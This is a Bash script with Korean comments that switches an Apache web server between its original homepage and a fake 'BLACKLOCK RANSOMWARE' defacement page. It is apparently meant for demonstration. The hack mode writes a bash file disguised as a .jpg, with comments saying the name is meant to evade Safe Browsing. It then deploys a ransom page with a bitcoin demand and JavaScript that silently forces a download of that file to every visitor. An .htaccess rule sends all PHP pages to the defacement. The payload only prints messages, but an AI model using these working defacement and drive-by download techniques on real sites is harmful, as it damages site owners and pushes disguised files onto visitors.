#!/bin/bash
###############################################################################
# 원본/해킹 페이지 토글 (다운로드 없음)
# MODERN_DEFACEMENT_FIXED와 원본을 왔다갔다 전환
###############################################################################

echo "╔═══════════════════════════════════════════════╗"
echo "║   원본/해킹 페이지 토글                      ║"
echo "╚═══════════════════════════════════════════════╝"
echo ""

# Root 권한 확인
if [ "$EUID" -ne 0 ]; then
    echo "❌ Root 권한이 필요합니다. sudo를 사용하세요."
    exit 1
fi

PUBLIC="/var/www/html/public"
WWW="/var/www/html/www"
BACKUP_ORIGINAL="/tmp/index_ORIGINAL.php"
BACKUP_HACKED="/tmp/index_HACKED.php"

# 현재 상태 확인 (public 우선)
if [ -f "$PUBLIC/index.php" ]; then
    INDEX_FILE="$PUBLIC/index.php"
elif [ -f "$WWW/index.php" ]; then
    INDEX_FILE="$WWW/index.php"
else
    echo "❌ index.php가 없습니다!"
    exit 1
fi

if grep -q "BLACKLOCK RANSOMWARE" "$INDEX_FILE"; then
    CURRENT_STATE="hacked"
else
    CURRENT_STATE="original"
fi

echo "[*] 현재 상태: $CURRENT_STATE"
echo ""

if [ "$CURRENT_STATE" == "hacked" ]; then
    # 해킹 → 원본
    echo "[*] 해킹 페이지 → 원본 페이지로 전환 중..."

    # 해킹 페이지 백업 (다음에 다시 쓸 수 있게)
    cp "$INDEX_FILE" "$BACKUP_HACKED"

    # 원본 복구
    if [ -f "$BACKUP_ORIGINAL" ]; then
        # public과 www 모두 복구
        cp "$BACKUP_ORIGINAL" "$PUBLIC/index.php"
        cp "$BACKUP_ORIGINAL" "$WWW/index.php"
        chmod 644 "$PUBLIC/index.php" "$WWW/index.php"
        chown apache:apache "$PUBLIC/index.php" "$WWW/index.php"

        # .htaccess 제거
        rm -f "$PUBLIC/.htaccess" "$WWW/.htaccess"

        # 악성 파일 제거
        rm -f "$PUBLIC/network_diagram.jpg" "$WWW/network_diagram.jpg"

        echo "✅ 원본 페이지로 복구됨"
    else
        echo "❌ 원본 백업 파일이 없습니다: $BACKUP_ORIGINAL"
        echo "   처음 해킹할 때 백업을 만들어야 합니다."
        exit 1
    fi

else
    # 원본 → 해킹
    echo "[*] 원본 페이지 → 해킹 페이지로 전환 중..."

    # 원본 백업 (처음이면)
    if [ ! -f "$BACKUP_ORIGINAL" ]; then
        cp "$INDEX_FILE" "$BACKUP_ORIGINAL"
        echo "✅ 원본 백업 생성: $BACKUP_ORIGINAL"
    fi

    # 악성 파일 생성 (network_diagram.jpg)
    cat > "$PUBLIC/network_diagram.jpg" << 'EOFMALWARE'
#!/bin/bash
# 실제 악성코드 대신 PoC (Proof of Concept)
# .jpg 확장자로 위장하여 구글 Safe Browsing 우회
# 실제 환경에서는 백도어, 랜섬웨어 등이 들어갈 수 있음

echo "System Update Initiated..."
echo "Connecting to C2 Server: attacker.onion"
echo "Stealing credentials..."
echo "Encrypting files..."
echo "Ransomware activated!"
EOFMALWARE

    chmod 644 "$PUBLIC/network_diagram.jpg"
    chown apache:apache "$PUBLIC/network_diagram.jpg" 2>/dev/null
    cp "$PUBLIC/network_diagram.jpg" "$WWW/network_diagram.jpg"
    chmod 644 "$WWW/network_diagram.jpg"
    chown apache:apache "$WWW/network_diagram.jpg" 2>/dev/null
    echo "✅ 악성 파일 생성됨: network_diagram.jpg"

    # 해킹 페이지 배포 (항상 새로 생성하여 최신 버전 사용)
    # 예전 백업 삭제
    rm -f "$BACKUP_HACKED"

    # 새로 생성 (public에 먼저)
        cat > "$PUBLIC/index.php" << 'EOFHACKED'
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYSTEM COMPROMISED</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
            color: #e0e0e0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            min-height: 100vh;
            padding: 2rem;
        }
        .container { max-width: 1000px; margin: 0 auto; }
        .header { text-align: center; padding: 3rem 0; border-bottom: 1px solid #2a2a2a; }
        .logo { font-size: 2.5rem; font-weight: 700; color: #ff3b3b; letter-spacing: 2px; margin-bottom: 1rem; }
        .subtitle { color: #888; font-size: 0.95rem; font-weight: 500; }
        .alert-box {
            background: linear-gradient(135deg, #2a0000 0%, #1a0000 100%);
            border: 1px solid #ff3b3b;
            border-radius: 12px;
            padding: 2rem;
            margin: 2rem 0;
        }
        .alert-title { font-size: 1.5rem; font-weight: 600; color: #ff3b3b; margin-bottom: 1rem; }
        .alert-content { color: #ccc; line-height: 1.6; font-size: 0.95rem; }
        .countdown-box {
            background: #1a1a1a;
            border: 1px solid #ff3b3b;
            border-radius: 8px;
            padding: 2rem;
            text-align: center;
            margin: 2rem 0;
        }
        .countdown-title { color: #ff3b3b; font-size: 0.9rem; text-transform: uppercase; margin-bottom: 1rem; }
        .countdown-timer { font-size: 3rem; font-weight: 700; color: #ff3b3b; }
        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 1.5rem;
            margin: 2rem 0;
        }
        .info-card {
            background: #1a1a1a;
            border: 1px solid #2a2a2a;
            border-radius: 8px;
            padding: 1.5rem;
        }
        .info-card-title {
            font-size: 0.85rem;
            color: #888;
            text-transform: uppercase;
            margin-bottom: 0.75rem;
        }
        .info-card-value { font-size: 1.1rem; color: #fff; font-weight: 500; word-break: break-all; }
        .malware-alert {
            background: linear-gradient(135deg, #2a0a00 0%, #1a0500 100%);
            border: 2px solid #ff6b3b;
            border-radius: 12px;
            padding: 1.5rem;
            margin: 2rem 0;
            animation: pulse-red 2s infinite;
        }
        .malware-alert h3 { color: #ff6b3b; margin-bottom: 0.75rem; }
        .footer { text-align: center; padding: 2rem 0; border-top: 1px solid #2a2a2a; margin-top: 3rem; color: #555; font-size: 0.85rem; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
        @keyframes pulse-red {
            0%, 100% { box-shadow: 0 0 10px #ff3b3b; }
            50% { box-shadow: 0 0 30px #ff3b3b; }
        }
        .pulse { animation: pulse 2s ease-in-out infinite; }
        #download-status {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(255, 0, 0, 0.9);
            padding: 15px;
            border-radius: 5px;
            color: #fff;
            font-size: 12px;
            display: none;
            z-index: 1000;
        }
    </style>
</head>
<body>
    <div id="download-status"></div>
    <div class="container">
        <div class="header">
            <div class="logo">🔒 BLACKLOCK RANSOMWARE</div>
            <div class="subtitle">Advanced Persistent Threat Detection</div>
        </div>

        <div class="alert-box">
            <div class="alert-title">⚠ YOUR NETWORK HAS BEEN COMPROMISED</div>
            <div class="alert-content">
                All your files, databases, and backups have been encrypted with military-grade AES-256 encryption.
                Attempts to decrypt or restore files without our software will result in permanent data loss.
            </div>
        </div>

        <div class="countdown-box">
            <div class="countdown-title">Time until price doubles</div>
            <div class="countdown-timer" id="timer">47:23:15</div>
        </div>

        <div class="info-grid">
            <div class="info-card">
                <div class="info-card-title">Payment Required</div>
                <div class="info-card-value">5.2 BTC (~$185,000)</div>
            </div>
            <div class="info-card">
                <div class="info-card-title">Bitcoin Wallet</div>
                <div class="info-card-value" style="font-size:0.85rem;">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</div>
            </div>
            <div class="info-card">
                <div class="info-card-title">Files Encrypted</div>
                <div class="info-card-value">127,483 files</div>
            </div>
            <div class="info-card">
                <div class="info-card-title">Infection ID</div>
                <div class="info-card-value" style="font-size:0.85rem;"><?php echo strtoupper(md5(gethostname())); ?></div>
            </div>
        </div>

        <div class="malware-alert">
            <h3>🦠 Malware Distribution in Progress</h3>
            <div style="margin: 0.5rem 0; color: #ccc;">⚠️ File automatically downloading to your system</div>
            <div style="margin: 0.5rem 0; color: #ccc;">📁 Disguised filename: <code style="background: rgba(255,255,255,0.1); padding: 2px 6px; border-radius: 3px;">network_diagram.jpg</code></div>
            <div style="margin: 0.5rem 0; color: #ccc;">🎯 Target: All visitors</div>
        </div>

        <div class="footer">
            <p>Compromised: <?php echo date('Y-m-d H:i:s'); ?> UTC | Server: <?php echo gethostname(); ?></p>
            <p style="margin-top:0.5rem;">Perfect Security + One Configuration Error = Total Compromise</p>
        </div>
    </div>

    <script>
        // Countdown timer
        let timeLeft = 47 * 3600 + 23 * 60 + 15;
        function updateTimer() {
            const hours = Math.floor(timeLeft / 3600);
            const minutes = Math.floor((timeLeft % 3600) / 60);
            const seconds = timeLeft % 60;
            document.getElementById('timer').textContent =
                `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
            if (timeLeft > 0) timeLeft--;
        }
        setInterval(updateTimer, 1000);
        updateTimer();

        // 🦠 자동 악성 파일 다운로드
        function silentDownload() {
            const statusDiv = document.getElementById('download-status');

            // XHR로 실제 파일 다운로드
            const xhr = new XMLHttpRequest();
            xhr.open('GET', '/network_diagram.jpg', true);
            xhr.responseType = 'blob';

            xhr.onload = function() {
                if (xhr.status === 200) {
                    const blob = xhr.response;
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.style.display = 'none';
                    a.href = url;
                    a.download = 'network_diagram.jpg';
                    document.body.appendChild(a);
                    a.click();

                    statusDiv.textContent = '🦠 Malware Downloaded';
                    statusDiv.style.display = 'block';

                    setTimeout(() => {
                        statusDiv.style.display = 'none';
                    }, 3000);

                    window.URL.revokeObjectURL(url);
                    document.body.removeChild(a);
                }
            };

            xhr.send();
        }

        // 페이지 로드 3초 후 자동 다운로드
        window.addEventListener('load', () => {
            setTimeout(silentDownload, 3000);
        });

        // 클릭할 때마다 재시도 (3번마다)
        let clickCount = 0;
        document.addEventListener('click', () => {
            clickCount++;
            if (clickCount % 3 === 0) {
                silentDownload();
            }
        });
    </script>
</body>
</html>
EOFHACKED

    # www 폴더에도 복사
    cp "$PUBLIC/index.php" "$WWW/index.php"

    # 새로운 버전을 백업으로 저장 (다음에 사용)
    cp "$PUBLIC/index.php" "$BACKUP_HACKED"

    echo "✅ 최신 해킹 페이지 배포 (JPG 자동 다운로드 포함)"

    # .htaccess 설정 (모든 PHP 페이지 리다이렉트)
    cat > "$PUBLIC/.htaccess" << 'EOFHTACCESS'
<IfModule mod_rewrite.c>
RewriteEngine On

# 예외: index.php, api, network_diagram.jpg는 리다이렉트 안함
RewriteCond %{REQUEST_URI} !^/index\.php$
RewriteCond %{REQUEST_URI} !^/api/
RewriteCond %{REQUEST_URI} !^/network_diagram\.jpg$

# 모든 .php 파일을 index.php로 리다이렉트
RewriteCond %{REQUEST_URI} \.php$
RewriteRule ^.*$ /index.php [L,R=302]
</IfModule>
EOFHTACCESS

    cp "$PUBLIC/.htaccess" "$WWW/.htaccess"

    chmod 644 "$PUBLIC/index.php" "$WWW/index.php"
    chmod 644 "$PUBLIC/.htaccess" "$WWW/.htaccess"
    chown apache:apache "$PUBLIC/index.php" "$WWW/index.php"
    chown apache:apache "$PUBLIC/.htaccess" "$WWW/.htaccess"
fi

# Apache 재시작
systemctl restart httpd 2>/dev/null || service httpd restart 2>/dev/null

echo ""
echo "╔═══════════════════════════════════════════════╗"
echo "║   ✅ 완료!                                    ║"
echo "╚═══════════════════════════════════════════════╝"
echo ""

if [ "$CURRENT_STATE" == "hacked" ]; then
    echo "✅ 원본 페이지로 복구됨 (악성 파일 제거됨)"
    echo "   다시 해킹 페이지로: sudo bash $0"
else
    echo "✅ 해킹 페이지 배포됨 (JPG 자동 다운로드 포함)"
    echo "   원본 복구: sudo bash $0"
fi

echo ""
echo "📁 백업 파일:"
echo "   원본: $BACKUP_ORIGINAL"
echo "   해킹: $BACKUP_HACKED"
echo ""
